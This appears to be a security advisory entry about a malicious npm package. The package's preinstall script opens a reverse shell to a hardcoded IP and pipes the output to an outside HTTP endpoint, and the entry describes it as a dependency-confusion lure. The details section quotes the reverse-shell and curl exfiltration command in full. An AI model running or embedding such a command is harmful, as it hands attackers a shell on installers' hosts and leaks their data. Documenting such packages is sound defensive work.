summary: preinstall script opens reverse shell to hardcoded IP and exfiltrates output on npm install
details: package.json declares a preinstall lifecycle script that executes `bash -i >& /dev/tcp/147.93.157.202/8080` to open an interactive reverse shell to 147.93.157.202:8080, and pipes the resulting stream into `curl -X POST --data-binary @- http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php`. This runs automatically on `npm install`, granting the operator of 147.93.157.202 an unauthenticated shell on the installer's host and simultaneously exfiltrating the shell's output over plain HTTP to a hardcoded canarytokens.com endpoint. The package name plus a version number of 19999.0.4 is consistent with a dependency-confusion lure designed to win resolution against an internal `@nimbusedge/auth` package, but the shipped payload is a live reverse shell rather than a benign canary.

cwes.description: The product contains code that appears to be malicious in nature.
